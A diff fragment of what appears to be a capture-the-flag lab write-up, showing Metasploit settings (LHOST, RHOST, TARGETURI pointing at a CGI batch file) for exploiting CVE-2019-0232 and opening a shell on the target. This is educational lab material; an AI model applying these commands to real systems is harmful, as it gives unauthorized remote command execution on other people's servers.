@@ -27,7 +27,9 @@ Search for CVE number, i.e. search ***2019-0232***
 Now we must ***set up our hosts***. This can be done pretty simply by setting LHOST to the IP of our PC and the RHOSTS to the IP of the target machine:
 
 `set LHOST 10.17.5.246`
+
 `set RHOST 10.10.183.54`
+
 `set TARGETURI http://10.10.183.54/cgi-bin/elfwhacker.bat`
 
 After setting the hosts, just ***run*** that using `run` and also to use system commands on host, we'll use ***shell***, which is also written in the dossier, so just give the command `shell`.
